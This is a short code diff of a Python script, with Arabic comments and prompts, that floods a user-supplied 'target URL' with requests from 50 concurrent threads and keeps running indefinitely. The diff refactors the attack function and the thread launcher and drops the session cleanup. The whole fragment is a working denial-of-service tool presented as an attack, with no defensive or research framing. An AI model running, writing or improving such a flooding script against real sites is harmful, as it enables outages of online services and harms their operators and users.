@@ -19,18 +19,14 @@ def attack(url):
             print("تم إرسال الطلب إلى:", url)
         except requests.RequestException as e:
             print("حدث خطأ:", e)
-        finally:
-            session.close()
         time.sleep(1)  # تأخير لإعطاء وقت للموارد
 
-url = input("أدخل رابط الهدف: ")
-
-def start_attack():
+def start_attack(url):
     with ThreadPoolExecutor(max_workers=50) as executor:
-        for _ in range(50):  # عدد الخيوط
+        for _ in range(50):
             executor.submit(attack, url)
 
-start_attack()
-
+url = input("أدخل رابط الهدف: ")
+start_attack(url)
 while True:
     time.sleep(3600)  # استمر في العمل لمدة ساعة (3600 ثانية)
